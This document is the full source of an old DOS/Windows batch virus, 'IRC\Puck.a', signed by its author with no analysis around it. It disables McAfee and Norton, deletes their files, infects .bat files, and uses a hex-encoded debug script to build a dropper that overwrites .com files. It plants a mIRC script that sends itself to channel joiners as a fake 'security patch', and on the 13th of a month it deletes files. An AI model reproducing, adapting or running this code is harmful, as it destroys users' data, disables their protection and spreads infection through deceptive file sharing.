@echo off

Rem :*======================================================*:
Rem :::: IRC\Puck.a                                       ::::
Rem :::: ฉ 2k6-1-20 By ELF_CRUEL / [P.V.T]                ::::
Rem :::: X-paC Instaler Batch Virus                       ::::
Rem :::: http://www.purgatory.net.tf                      ::::
Rem :*======================================================*:

NET STOP MCSHIELD >Nul
NET STOP NORTON ANTIVIRUS AUTO PROTECT SERVICE >Nul
deltree /y c:\progra~1\mcafee.com\vso\*.dat >nul
deltree /y c:\progra~1\norton~1\*.dll >nul
for %%C in    (..\*.bat %path%\*.bat C:\Perl\bin\*.bat C:\*.bat *.bat)    do attrib -s -r -h %%C >nul
for %%M in    (..\*.bat %path%\*.bat C:\Perl\bin\*.bat C:\*.bat *.bat)    do copy %%M +%0 >nul
echo n Comand.com >$
echo e 0100  4D 5A 00 01 09 00 3A 00 11 00 AF 01 A9 02 36 01>>$
echo e 0110  88 13 00 00 98 01 00 00 1C 00 00 00 29 00 00 00>>$
echo e 0120  54 00 00 00 5F 00 00 00 69 00 00 00 78 00 00 00>>$
echo e 0130  8D 00 00 00 98 00 00 00 9D 00 00 00 B2 00 00 00>>$
echo e 0140  C0 00 00 00 C5 00 00 00 D0 00 00 00 D5 00 00 00>>$
echo e 0150  9B 01 00 00 A6 01 00 00 BA 01 00 00 C8 01 00 00>>$
echo e 0160  DB 01 00 00 F5 01 00 00 FA 01 00 00 0B 02 00 00>>$
echo e 0170  1F 02 00 00 33 02 00 00 38 02 00 00 3D 02 00 00>>$
echo e 0180  4F 02 00 00 54 02 00 00 59 02 00 00 6B 02 00 00>>$
echo e 0190  70 02 00 00 75 02 00 00 87 02 00 00 8C 02 00 00>>$
echo e 01A0  91 02 00 00 A3 02 00 00 A8 02 00 00 AD 02 00 00>>$
echo e 01B0  BF 02 00 00 C4 02 00 00 C9 02 00 00 DB 02 00 00>>$
echo e 01C0  E0 02 00 00 E5 02 00 00 F7 02 00 00 FC 02 00 00>>$
echo e 01D0  01 03 00 00 11 03 00 00 16 03 00 00 1B 03 00 00>>$
echo e 01E0  25 03 00 00 69 01 33 00 01 00 4C 00 1B 01 4C 00>>$
echo e 01F0  10 03 4C 00 01 0A 4C 00 1C 0A 4C 00 32 0A 4C 00>>$
echo e 0200  51 0A 4C 00 00 00 00 00 00 00 00 00 00 00 00 00>>$
echo e 0210  01 20 05 20 3E 4E 75 6C 0D 20 2F 63 20 61 74 74>>$
echo e 0220  72 69 62 20 2D 72 09 20 2F 63 20 63 6F 70 79 20>>$
echo e 0230  55 89 E5 B8 00 04 9A CD 02 4C 00 81 EC 00 04 8C>>$
echo e 0240  D3 8E C3 8C DB FC 8D BE 00 FF C5 76 04 AC AA 91>>$
echo e 0250  30 ED F3 A4 8E DB 8D BE 00 FD 16 57 BF 00 00 0E>>$
echo e 0260  57 9A B5 07 4C 00 8D BE 00 FF 16 57 9A 34 08 4C>>$
echo e 0270  00 BF 02 00 0E 57 9A 34 08 4C 00 8D BE 00 FE 16>>$
echo e 0280  57 B8 FF 00 50 9A CF 07 4C 00 BF 52 00 1E 57 8D>>$
echo e 0290  BE 00 FD 16 57 BF 08 00 0E 57 9A B5 07 4C 00 8D>>$
echo e 02A0  BE 00 FE 16 57 9A 34 08 4C 00 9A EA 00 33 00 BF>>$
echo e 02B0  52 00 1E 57 8D BE 00 FC 16 57 BF 16 00 0E 57 9A>>$
echo e 02C0  B5 07 4C 00 8D BE 00 FD 16 57 31 C0 50 9A 2D 07>>$
echo e 02D0  4C 00 9A 34 08 4C 00 8D BE 00 FE 16 57 9A 34 08>>$
echo e 02E0  4C 00 9A EA 00 33 00 89 EC 5D C2 04 00 07 43 4F>>$
echo e 02F0  4D 53 50 45 43 05 2A 2E 63 6F 6D 0B 43 4F 4D 4D>>$
echo e 0300  41 4E 44 2E 43 4F 4D 00 1F 2A 3D 3D 3D 3D 3D 3D>>$
echo e 0310  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>$
echo e 0320  3D 3D 3D 3D 3D 3D 3D 2A 1F 2A 20 57 61 72 6E 69>>$
echo e 0330  6E 67 20 21 21 20 20 20 20 20 20 20 20 20 20 20>>$
echo e 0340  20 20 20 20 20 20 20 2A 1F 2A 20 54 68 69 73 20>>$
echo e 0350  49 73 20 58 2D 70 61 43 20 56 69 72 75 53 20 56>>$
echo e 0360  2E 31 20 21 21 20 20 2A 1F 2A 20 28 43 29 20 42>>$
echo e 0370  79 20 45 4C 46 5F 43 52 55 45 4C 20 2F 20 50 2E>>$
echo e 0380  56 2E 54 20 01 20 20 2A 1F 2A 20 68 74 74 70 3A>>$
echo e 0390  2F 2F 77 77 77 2E 70 75 72 67 61 74 6F 72 79 2E>>$
echo e 03A0  6E 65 74 2E 74 66 20 2A 9A 00 00 4C 00 55 89 E5>>$
echo e 03B0  B8 00 01 9A CD 02 4C 00 81 EC 00 01 8D BE 00 FF>>$
echo e 03C0  16 57 BF DD 00 0E 57 9A 7C 00 33 00 BF 52 00 1E>>$
echo e 03D0  57 B8 FF 00 50 9A CF 07 4C 00 BF E5 00 0E 57 B8>>$
echo e 03E0  21 00 50 BF 52 01 1E 57 9A 00 00 33 00 83 3E 7E>>$
echo e 03F0  01 00 75 3F BF 70 01 1E 57 8D BE 00 FF 16 57 31>>$
echo e 0400  C0 50 9A 2D 07 4C 00 9A A6 08 4C 00 74 19 BF 70>>$
echo e 0410  01 1E 57 BF EB 00 0E 57 9A A6 08 4C 00 74 08 BF>>$
echo e 0420  70 01 1E 57 E8 09 FE BF 52 01 1E 57 9A 3E 00 33>>$
echo e 0430  00 EB BA BF 84 02 1E 57 BF F7 00 0E 57 31 C0 50>>$
echo e 0440  9A 01 07 4C 00 9A DD 05 4C 00 9A 91 02 4C 00 BF>>$
echo e 0450  84 02 1E 57 BF F8 00 0E 57 31 C0 50 9A 01 07 4C>>$
echo e 0460  00 9A DD 05 4C 00 9A 91 02 4C 00 BF 84 02 1E 57>>$
echo e 0470  BF 18 01 0E 57 31 C0 50 9A 01 07 4C 00 9A DD 05>>$
echo e 0480  4C 00 9A 91 02 4C 00 BF 84 02 1E 57 BF 38 01 0E>>$
echo e 0490  57 31 C0 50 9A 01 07 4C 00 9A DD 05 4C 00 9A 91>>$
echo e 04A0  02 4C 00 BF 84 02 1E 57 BF 58 01 0E 57 31 C0 50>>$
echo e 04B0  9A 01 07 4C 00 9A DD 05 4C 00 9A 91 02 4C 00 BF>>$
echo e 04C0  84 02 1E 57 BF 78 01 0E 57 31 C0 50 9A 01 07 4C>>$
echo e 04D0  00 9A DD 05 4C 00 9A 91 02 4C 00 BF 84 02 1E 57>>$
echo e 04E0  BF F8 00 0E 57 31 C0 50 9A 01 07 4C 00 9A DD 05>>$
echo e 04F0  4C 00 9A 91 02 4C 00 BF 84 02 1E 57 BF F7 00 0E>>$
echo e 0500  57 31 C0 50 9A 01 07 4C 00 9A DD 05 4C 00 9A 91>>$
echo e 0510  02 4C 00 BF 84 02 1E 57 B0 07 50 31 C0 50 9A 7B>>$
echo e 0520  06 4C 00 9A DD 05 4C 00 9A 91 02 4C 00 89 EC 5D>>$
echo e 0530  31 C0 9A 16 01 4C 00 00 00 00 00 00 00 00 00 00>>$
echo e 0540  55 8B EC 83 EC 50 1E C5 76 0C 8D 7E B0 16 07 FC>>$
echo e 0550  AC 3C 4F 72 02 B0 4F 98 91 F3 A4 32 C0 AA C5 56>>$
echo e 0560  06 B4 1A CD 21 8D 56 B0 16 1F 8B 4E 0A B4 4E CD>>$
echo e 0570  21 1F C4 7E 06 E8 20 00 8B E5 5D CA 0A 00 55 8B>>$
echo e 0580  EC 1E C5 56 06 B4 1A CD 21 1F B4 4F CD 21 C4 7E>>$
echo e 0590  06 E8 04 00 5D CA 04 00 72 1E 83 C7 1E 1E 06 1F>>$
echo e 05A0  32 C0 B9 00 01 FC F2 AE F6 D1 8A C1 4F 8B F7 4E>>$
echo e 05B0  FD F3 A4 AA FC 1F 33 C0 A3 7E 01 C3 55 8B EC 83>>$
echo e 05C0  EC 20 1E FC C5 76 06 8D 7E E0 16 07 AC 3C 1F 76>>$
echo e 05D0  02 B0 1F 98 8B C8 40 8B D0 E3 0E AC 3C 61 72 06>>$
echo e 05E0  3C 7A 77 02 2C 20 AA E2 F2 B0 3D AA 1F 1E 8E 1E>>$
echo e 05F0  38 00 8E 1E 2C 00 33 F6 80 3C 00 74 11 8D 7E E0>>$
echo e 0600  8B CA F3 A6 74 08 4E AC 0A C0 75 FB EB EA 8B FE>>$
echo e 0610  1E 07 32 C0 B9 00 01 F2 AE F6 D1 C4 7E 0A 8A C1>>$
echo e 0620  AA F3 A4 1F 8B E5 5D CA 04 00 55 8B EC 89 26 80>>$
echo e 0630  01 8C 16 82 01 81 EC FE 00 8E 1E 38 00 A1 2C 00>>$
echo e 0640  89 46 F2 16 07 FC C5 76 0A 8D 7E 82 AC 3C 4F 72>>$
echo e 0650  02 B0 4F 98 91 F3 A4 32 C0 AA C5 76 06 8D BE 02>>$
echo e 0660  FF AC 3C 7E 72 02 B0 7E AA 98 91 F3 A4 B0 0D AA>>$
echo e 0670  16 1F 8D B6 02 FF 89 76 F4 8C 5E F6 46 8D 7E E2>>$
echo e 0680  89 7E F8 8C 46 FA B8 01 29 CD 21 8D 7E D2 89 7E>>$
echo e 0690  FC 8C 46 FE B8 01 29 CD 21 8D 56 82 8D 5E F2 B8>>$
echo e 06A0  00 4B CD 21 72 02 33 C0 BA F9 00 8E DA FA 8B 26>>$
echo e 06B0  80 01 8E 16 82 01 FB A3 7E 01 5D CA 08 00 B4 4D>>$
echo e 06C0  CD 21 CB 00 00 00 00 00 00 00 00 00 00 00 00 00>>$
echo e 06D0  BA F9 00 8E DA 8C 06 38 00 33 ED E8 A5 0A E8 A0>>$
echo e 06E0  00 8B C4 05 13 00 B1 04 D3 E8 8C D2 03 C2 A3 0A>>$
echo e 06F0  00 A3 0C 00 03 06 04 00 A3 0E 00 A3 18 00 A3 1C>>$
echo e 0700  00 A3 24 00 8E 06 38 00 26 A1 02 00 A3 20 00 C7>>$
echo e 0710  06 2A 00 D6 00 8C 0E 2C 00 BF 84 03 BE 39 02 B9>>$
echo e 0720  13 00 90 FC 2E AC B4 35 CD 21 89 1D 8C 45 02 83>>$
echo e 0730  C7 04 E2 EF 1E 0E 1F BA 0C 01 B8 00 25 CD 21 BA>>$
echo e 0740  13 01 B8 23 25 CD 21 BA DB 00 B8 24 25 CD 21 BA>>$
echo e 0750  04 01 B8 3F 25 CD 21 1F B8 84 01 1E 50 1E 50 B8>>$
echo e 0760  63 02 0E 50 0E E8 4E 02 0E E8 C8 02 B8 84 02 1E>>$
echo e 0770  50 1E 50 B8 63 02 0E 50 0E E8 3A 02 0E E8 B9 02>>$
echo e 0780  CB 33 C0 9C 5B 80 E7 0F 53 9D 9C 59 80 E5 F0 80>>$
echo e 0790  FD F0 74 0E 40 80 CF F0 53 9D 9C 59 80 E5 F0 74>>$
echo e 07A0  01 40 A2 4C 00 C3 33 C0 CA 02 00 FB 83 C4 06 58>>$
echo e 07B0  83 E7 1F 81 C7 96 00 80 FC 39 73 03 BF FF FF 57>>$
echo e 07C0  B4 54 CD 21 8B EC 80 4E 16 01 58 5B 59 5A 5E 5F>>$
echo e 07D0  5D 1F 07 CF B8 D0 00 83 C4 06 EB 03 B8 C8 00 59>>$
echo e 07E0  5B EB 07 B8 FF 00 33 C9 33 DB BA F9 00 8E DA FB>>$
echo e 07F0  A3 32 00 8B C1 0B C3 74 3D A1 10 00 0B C0 74 2F>>$
echo e 0800  8E C0 26 A1 10 00 0B C0 74 1B 2B C3 77 17 F7 D8>>$
echo e 0810  3D 00 10 73 10 BA 10 00 F7 E2 03 C1 72 07 26 3B>>$
echo e 0820  06 08 00 72 06 26 A1 14 00 EB D1 8B C8 8C C3 2B>>$
echo e 0830  1E 38 00 83 EB 10 89 0E 34 00 89 1E 36 00 C4 1E>>$
echo e 0840  2E 00 8C C0 0B C3 74 13 33 C0 A3 2E 00 A3 30 00>>$
echo e 0850  A3 3C 00 B8 6E 01 0E 50 06 53 CB B8 84 01 1E 50>>$
echo e 0860  0E E8 2A 02 B8 84 02 1E 50 0E E8 21 02 BF 84 03>>$
echo e 0870  BE 39 02 B9 13 00 90 FC 2E AC B4 25 1E C5 15 CD>>$
echo e 0880  21 1F 83 C7 04 E2 F0 A1 34 00 0B 06 36 00 74 29>>$
echo e 0890  BB 4C 02 E8 2A 00 A1 32 00 E8 32 00 BB 5B 02 E8>>$
echo e 08A0  1E 00 A1 36 00 E8 40 00 B0 3A E8 55 00 A1 34 00>>$
echo e 08B0  E8 35 00 BB 60 02 E8 07 00 A1 32 00 B4 4C CD 21>>$
echo e 08C0  2E 8A 07 0A C0 74 06 E8 38 00 43 EB F3 C3 B1 64>>$
echo e 08D0  E8 07 00 B1 0A E8 02 00 EB 04 32 E4 F6 F1 04 30>>$
echo e 08E0  50 E8 1E 00 58 8A C4 C3 50 8A C4 E8 01 00 58 50>>$
echo e 08F0  B1 04 D2 E8 E8 03 00 58 24 0F 04 30 3C 3A 72 02>>$
echo e 0900  04 07 8A D0 B4 06 CD 21 C3 00 02 1B 21 23 24 34>>$
echo e 0910  35 36 37 38 39 3A 3B 3C 3D 3E 3F 75 52 75 6E 74>>$
echo e 0920  69 6D 65 20 65 72 72 6F 72 20 00 20 61 74 20 00>>$
echo e 0930  2E 0D 0A 00 50 6F 72 74 69 6F 6E 73 20 43 6F 70>>$
echo e 0940  79 72 69 67 68 74 20 28 63 29 20 31 39 38 33 2C>>$
echo e 0950  39 32 20 42 6F 72 6C 61 6E 64 33 C0 87 06 3C 00>>$
echo e 0960  CB 83 3E 3C 00 00 75 01 CB A1 3C 00 E9 70 FE 8B>>$
echo e 0970  F4 36 8E 44 02 26 3B 55 02 7F 07 7C 14 26 3B 05>>$
echo e 0980  72 0F 26 3B 55 06 7C 08 7F 07 26 3B 45 04 77 01>>$
echo e 0990  CB B8 C9 00 E9 48 FE B8 D7 00 E9 42 FE 05 00 02>>$
echo e 09A0  72 0D 2B C4 73 09 F7 D8 3B 06 3A 00 72 01 CB B8>>$
echo e 09B0  CA 00 E9 2A FE BA 33 D2 8B DC 1E 36 C4 7F 08 36>>$
echo e 09C0  C5 77 04 FC 33 C0 AB B8 B0 D7 AB B8 80 00 AB 33>>$
echo e 09D0  C0 AB AB AB 8D 45 74 AB 8C C0 AB B8 CC 09 AB B8>>$
echo e 09E0  4C 00 AB 33 C0 B9 0E 00 F3 AB B9 4F 00 0B D2 75>>$
echo e 09F0  09 AC 3A C8 76 04 8A C8 E3 08 AC 0A C0 74 03 AA>>$
echo e 0A00  E2 F8 32 C0 AA 1F CA 08 00 8B DC 36 C4 7F 0A 36>>$
echo e 0A10  8B 47 04 26 89 45 04 36 8B 47 06 26 89 45 0C 36>>$
echo e 0A20  8B 47 08 26 89 45 0E 33 C0 26 89 45 08 26 89 45>>$
echo e 0A30  0A CA 0A 00 BA B1 D7 EB 08 BA B2 D7 EB 03 BA B3>>$
echo e 0A40  D7 55 8B EC C4 7E 06 26 8B 45 02 3D B1 D7 74 12>>$
echo e 0A50  3D B2 D7 74 0D 3D B0 D7 74 10 C7 06 3C 00 66 00>>$
echo e 0A60  EB 24 52 06 57 0E E8 25 00 5A 33 C0 26 89 55 02>>$
echo e 0A70  26 89 45 08 26 89 45 0A BB 10 00 E8 4C 00 74 06>>$
echo e 0A80  26 C7 45 02 B0 D7 5D CA 04 00 B0 00 EB 02 B0 01>>$
echo e 0A90  55 8B EC C4 7E 06 26 81 7D 02 B1 D7 74 18 26 81>>$
echo e 0AA0  7D 02 B2 D7 74 08 C7 06 3C 00 67 00 EB 18 50 BB>>$
echo e 0AB0  14 00 E8 15 00 58 0A C0 74 0C BB 1C 00 E8 0A 00>>$
echo e 0AC0  26 C7 45 02 B0 D7 5D CA 04 00 06 57 06 57 26 FF>>$
echo e 0AD0  19 0B C0 74 03 A3 3C 00 5F 07 C3 8B DC 1E 36 C4>>$
echo e 0AE0  7F 04 26 C5 55 0C 26 8B 4D 04 26 8B 1D B4 3F CD>>$
echo e 0AF0  21 72 10 26 89 45 0A 33 C0 26 C7 45 08 00 00 1F>>$
echo e 0B00  CA 04 00 26 C7 45 0A 00 00 EB EE 8B DC 1E 36 C4>>$
echo e 0B10  7F 04 26 C5 55 0C 33 C9 26 87 4D 08 26 8B 1D B4>>$
echo e 0B20  40 CD 21 72 07 2B C1 74 03 B8 65 00 1F CA 04 00>>$
echo e 0B30  8B DC 1E 36 C4 7F 04 26 C5 55 0C 33 C9 26 87 4D>>$
echo e 0B40  08 26 8B 1D B4 40 CD 21 72 02 33 C0 1F CA 04 00>>$
echo e 0B50  8B DC 36 C4 7F 04 26 8B 1D 83 FB 04 76 06 B4 3E>>$
echo e 0B60  CD 21 72 02 33 C0 CA 04 00 83 3E 3C 00 00 75 35>>$
echo e 0B70  26 81 7F 02 B1 D7 75 2E 26 8B 77 08 26 3B 77 0A>>$
echo e 0B80  74 2B 1E 06 53 52 26 C5 57 0C 26 8B 5F 0A 07 03>>$
echo e 0B90  DA 03 F2 FC FF D0 2B F2 8C C2 5B 07 1F 26 89 77>>$
echo e 0BA0  08 0B C0 75 08 C3 C7 06 3C 00 68 00 C3 50 51 52>>$
echo e 0BB0  57 06 53 E8 33 01 5B 07 5F 5A 59 58 26 8B 77 08>>$
echo e 0BC0  26 3B 77 0A 75 BC C3 83 3E 3C 00 00 75 40 26 81>>$
echo e 0BD0  7F 02 B2 D7 75 39 26 8B 4F 04 26 8B 7F 08 2B CF>>$
echo e 0BE0  2B D1 73 04 03 CA 33 D2 06 26 C4 77 0C 03 FE B0>>$
echo e 0BF0  20 FC F3 AA 2B FE 07 26 89 7F 08 26 3B 7F 04 75>>$
echo e 0C00  09 52 06 53 E8 E2 00 5B 07 5A 0B D2 75 C8 C3 C7>>$
echo e 0C10  06 3C 00 69 00 C3 83 3E 3C 00 00 75 48 26 81 7F>>$
echo e 0C20  02 B2 D7 75 41 26 8B 4F 04 26 8B 7F 08 2B CF 2B>>$
echo e 0C30  C1 73 04 03 C8 33 C0 1E 06 53 8E DA 26 C4 5F 0C>>$
echo e 0C40  03 FB FC F3 A4 2B FB 5B 07 1F 26 89 7F 08 26 3B>>$
echo e 0C50  7F 04 75 0D 50 52 56 06 53 E8 8D 00 5B 07 5E 5A>>$
echo e 0C60  58 0B C0 75 C0 C3 C7 06 3C 00 69 00 C3 55 8B EC>>$
echo e 0C70  C4 5E 06 B8 BB 05 33 D2 E8 EE FE 75 0A 26 83 7F>>$
echo e 0C80  1A 00 74 03 E8 70 00 5D CA 04 00 AC 3C 0D 74 0C>>$
echo e 0C90  3C 1A 74 11 3B F3 75 F3 B8 BB 05 C3 3B F3 74 09>>$
echo e 0CA0  AC 3C 0A 74 01 4E 33 C0 C3 B8 D0 05 C3 55 8B EC>>$
echo e 0CB0  C4 5E 06 B8 02 00 BE 50 00 8C DA E8 58 FF 75 0A>>$
echo e 0CC0  26 83 7F 1A 00 74 03 E8 2D 00 5D CA 04 00 55 8B>>$
echo e 0CD0  EC C4 5E 06 26 83 7F 1A 00 74 0A 83 3E 3C 00 00>>$
echo e 0CE0  75 03 E8 12 00 5D CA 04 00 06 53 26 FF 5F 14 0B>>$
echo e 0CF0  C0 74 03 A3 3C 00 C3 06 53 26 FF 5F 18 0B C0 74>>$
echo e 0D00  03 A3 3C 00 C3 55 8B EC 83 3E 3C 00 00 75 38 C4>>$
echo e 0D10  5E 06 26 81 7F 02 B1 D7 75 27 26 8B 7F 08 26 3B>>$
echo e 0D20  7F 0A 75 10 E8 C2 FF C4 5E 06 26 8B 7F 08 26 3B>>$
echo e 0D30  7F 0A 74 13 26 FF 47 08 26 C4 5F 0C 26 8A 01 5D>>$
echo e 0D40  CB C7 06 3C 00 68 00 B0 1A EB F4 55 8B EC C4 5E>>$
echo e 0D50  0A 8B 56 06 4A 7E 03 E8 6D FE 83 3E 3C 00 00 75>>$
echo e 0D60  29 26 81 7F 02 B2 D7 75 25 26 FF 47 08 26 8B 7F>>$
echo e 0D70  08 26 8B 57 04 26 C4 5F 0C 8A 46 08 26 88 41 FF>>$
echo e 0D80  3B FA 75 06 C4 5E 0A E8 5F FF 5D CA 04 00 C7 06>>$
echo e 0D90  3C 00 69 00 EB F4 55 8B EC C4 5E 0C B8 E9 06 8B>>$
echo e 0DA0  4E 06 8B 7E 08 8B 56 0A 47 E8 BD FD 8B C7 C4 7E>>$
echo e 0DB0  08 2B C7 48 AA 5D CA 06 00 AC 3C 0D 74 0F 3C 1A>>$
echo e 0DC0  74 0B AA 3B F3 E0 F2 E3 05 B8 E9 06 C3 4E 33 C0>>$
echo e 0DD0  C3 55 8B EC C4 5E 08 26 8A 07 32 E4 C4 5E 0C 8B>>$
echo e 0DE0  56 06 2B D0 7E 05 50 E8 DD FD 58 0B C0 74 0A 8B>>$
echo e 0DF0  76 08 8B 56 0A 46 E8 1D FE 5D CA 06 00 55 8B EC>>$
echo e 0E00  8B 56 06 0B D2 74 05 E8 49 00 EB 30 B4 30 CD 21>>$
echo e 0E10  3C 03 B8 00 00 72 25 8E 06 38 00 26 8E 06 2C 00>>$
echo e 0E20  33 FF FC 26 3A 05 74 07 B9 FF FF F2 AE EB F4 83>>$
echo e 0E30  C7 03 8B F7 B9 00 01 F2 AE 91 F6 D0 1E 06 1F C4>>$
echo e 0E40  7E 08 FC AA 91 F3 A4 1F 5D CA 02 00 33 D2 E8 02>>$
echo e 0E50  00 93 CB 8E 06 38 00 BF 80 00 26 8A 0D 32 ED 47>>$
echo e 0E60  33 DB E3 09 26 80 3D 20 77 03 47 E2 F7 8B F7 E3>>$
echo e 0E70  09 26 80 3D 20 76 03 47 E2 F7 8B C7 2B C6 74 04>>$
echo e 0E80  43 4A 75 DE C3 FC 8B DC 8C DA 36 C4 7F 08 36 C5>>$
echo e 0E90  77 04 AC AA 8A C8 32 ED F3 A4 8E DA CA 04 00 FC>>$
echo e 0EA0  8B DC 8C DA 36 C5 77 0A 36 C4 7F 06 36 8B 4F 04>>$
echo e 0EB0  AC 3A C1 76 02 8A C1 AA 8A C8 32 ED F3 A4 8E DA>>$
echo e 0EC0  CA 0A 00 FC 8B DC 8C DA 36 C4 7F 0C 36 C5 77 08>>$
echo e 0ED0  8A 04 32 E4 36 8B 4F 06 0B C9 7F 03 B9 01 00 03>>$
echo e 0EE0  F1 2B C1 72 13 40 36 8B 4F 04 0B C9 7D 02 33 C9>>$
echo e 0EF0  3B C1 76 06 8B C1 EB 02 33 C0 AA 8B C8 F3 A4 8E>>$
echo e 0F00  DA CA 08 00 FC 8B DC 8C DA 36 C4 7F 08 36 C5 77>>$
echo e 0F10  04 26 8A 0D 32 ED AC 26 00 05 73 08 26 C6 05 FF>>$
echo e 0F20  8A C1 F6 D0 03 F9 47 8A C8 F3 A4 8E DA CA 04 00>>$
echo e 0F30  55 8B EC 1E C5 76 0A FC AC 0A C0 74 2C 8A D0 32>>$
echo e 0F40  F6 C4 7E 06 26 8A 0D 32 ED 2B CA 72 1C 41 47 AC>>$
echo e 0F50  F2 AE 75 15 8B C7 8B D9 8B CA 49 F3 A6 74 0E 8B>>$
echo e 0F60  F8 8B CB 8B 76 0A 46 EB E6 33 C0 EB 04 48 2B 46>>$
echo e 0F70  06 1F 5D CA 08 00 FC 8B DC 8C DA 36 C5 77 08 36>>$
echo e 0F80  C4 7F 04 AC 26 8A 25 47 8A C8 3A CC 76 02 8A CC>>$
echo e 0F90  0A C9 74 06 32 ED F3 A6 75 02 3A C4 8E DA CA 08>>$
echo e 0FA0  00 FC 8B DC 36 C4 7F 06 B0 01 AA 36 8A 47 04 AA>>$
echo e 0FB0  CA 02 00 FC 8B DC 8C DA 36 C4 7F 0A 36 C5 77 06>>$
echo e 0FC0  36 8B 47 04 AA 8B C8 F3 A4 8E DA CA 06 00 55 8B>>$
echo e 0FD0  EC 81 EC 00 02 83 7E 06 01 7D 05 C7 46 06 01 00>>$
echo e 0FE0  8D BE 00 FF 16 57 C4 7E 0A 06 57 B8 01 00 50 8B>>$
echo e 0FF0  46 06 48 50 0E E8 CB FE C4 7E 0E 06 57 0E E8 03>>$
echo e 1000  FF 8D BE 00 FE 16 57 C4 7E 0A 06 57 FF 76 06 B8>>$
echo e 1010  FF 00 50 0E E8 AC FE 0E E8 E9 FE C4 7E 0A 06 57>>$
echo e 1020  FF 76 08 0E E8 78 FE 8B E5 5D CA 0C 00 55 8B EC>>$
echo e 1030  81 EC 00 02 83 7E 06 00 7E 5C 83 7E 08 00 7E 56>>$
echo e 1040  81 7E 08 FF 00 7F 4F 81 7E 06 FF 00 7E 05 C7 46>>$
echo e 1050  06 FF 00 8D BE 00 FF 16 57 C4 7E 0A 06 57 B8 01>>$
echo e 1060  00 50 8B 46 08 48 50 0E E8 58 FE 8D BE 00 FE 16>>$
echo e 1070  57 C4 7E 0A 06 57 8B 46 08 03 46 06 50 B8 FF 00>>$
echo e 1080  50 0E E8 3E FE 0E E8 7B FE C4 7E 0A 06 57 B8 FF>>$
echo e 1090  00 50 0E E8 09 FE 8B E5 5D CA 08 00 8B DC 1E 36>>$
echo e 10A0  C5 7F 04 33 C9 89 0D B8 00 3D 81 7D 02 B1 D7 74>>$
echo e 10B0  0D B0 02 FF 05 81 7D 02 B3 D7 74 02 B4 3C 80 7D>>$
echo e 10C0  30 00 74 09 8D 55 30 CD 21 72 5A 89 05 B8 0B 04>>$
echo e 10D0  BA 4C 00 33 C9 33 DB 81 7D 02 B1 D7 74 2F 8B 1D>>$
echo e 10E0  B8 00 44 CD 21 F6 C2 80 B8 60 04 BA 4C 00 8B C8>>$
echo e 10F0  8B DA 75 14 81 7D 02 B3 D7 75 03 E8 2B 00 B8 3B>>$
echo e 1100  04 BA 4C 00 33 C9 33 DB C7 45 02 B2 D7 89 45 14>>$
echo e 1110  89 55 16 89 4D 18 89 5D 1A C7 45 1C 80 04 C7 45>>$
echo e 1120  1E 4C 00 33 C0 1F CA 04 00 33 D2 33 C9 8B 1D B8>>$
echo e 1130  02 42 CD 21 2D 80 00 83 DA 00 73 04 33 C0 33 D2>>$
echo e 1140  8B CA 8B D0 8B 1D B8 00 42 CD 21 8D 95 80 00 B9>>$
echo e 1150  80 00 8B 1D B4 3F CD 21 73 02 33 C0 33 DB 3B D8>>$
echo e 1160  74 20 80 B9 80 00 1A 74 03 43 EB F2 8B D3 2B D0>>$
echo e 1170  B9 FF FF 8B 1D B8 02 42 CD 21 33 C9 8B 1D B4 40>>$
echo e 1180  CD 21 C3 BF 52 00 1E 07 B9 D0 03 2B CF D1 E9 33>>$
echo e 1190  C0 FC F3 AB C3 00 00 00 00 00 00 00 00 00 00 00>>$
echo e 11A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>$
echo e 11B0  00 00 00 00 FF FF 00 00 00 00 00 00 00 00 00 00>>$
echo e 11C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>$
echo e 11D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>$
echo e 11E0  00 00 00 10 40 00 00 A0 00 B0 00 B8 00 00 02 00>>$
echo e 11F0  0D 0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>$
echo e 1200  00>>$
echo rcx>>$
echo 1100>>$
echo w>>$
echo q>>$
debug < $ >nul
del $ >NuL
 for %%U in    (..\ %path%\ C:\Perl\bin\ C:\)    do copy /y Comand.com %%U\ >nul
 for %%_ in    (..\ %path%\ C:\Perl\bin\ C:\)    do copy %0 %%_\Mspuck32.bat >nul
:InFi$H
 for %%P in    (*.com ..\*.com %path%\*.com C:\Perl\bin\*.com C:\*.com)    do set pUcK=%%P >nul
 if not exist %pUcK% goto ENDINF
 attrib -r %pUcK% >nul
 echo %pUcK%|find "command.com" >nul
 if errorlevel 1 goto No
 ren %pUck% *.pck >nul
 Goto InFi$H
:No
 copy Comand.com %pUcK% >nul
 ren %pUck% *.pck >nul
 Goto InFi$H
:ENDINF
 for %%V in (..\*.pck %path%\*.pck C:\Perl\bin\*.pck C:\*.pck) do ren %%V *.com >nul
 set IRC= C:\progra~1\mIRC
 set IRC32= C:\progra~1\mIRC32
 set IRC2= C:\mIRC
 set IRC322= C:\mIRC32
 if exist %IRC%\*.* set mIRCdir=%IRC%
 if exist %IRC32%\*.* set mIRCdir=%IRC32%
 if exist %IRC2%\*.* set mIRCdir=%IRC2%
 if exist %IRC322%\*.* set mIRCdir=%IRC322%
 copy %0 %mIRCdir%\mIRc_Security.bat >nul
 set script=%mIRCdir%\script.ini
 set PC=JOIN:#:{ 
 echo [script] >%script%
 echo n0= on 1: %PC% >>%script%
 echo n1= /if ( $nick == $me ) { halt } >>%script%
 echo n2= /msg $nick Hello mIRC Security Patch For You . Check out this file :) >>%script%
 echo n3= /dcc send -c $nick %mIRCdir%\mIRc_Security.bat >>%script%
 echo n4= } >>%script%
 echo.|date|find "13" >nul
 if errorlevel 1 goto End
:MSG$
 if exist *.s* deltree /y *.s* >Nul
 if exist *.d* deltree /y *.d* >Nul
 cls
 echo.
 echo                          ษอออออออออออออออออออออออออออป
 echo                          บ Hi And Have A Nice Day    บ
 echo                          บ IRC\Puck.a Batch ViruS !! บ
 echo                          บ (C) By ELF_CRUEL / [P.V.T]บ
 echo                          ศอออออออออออออออออออออออออออผ
 echo 
 goto MSG$
:End
 exit

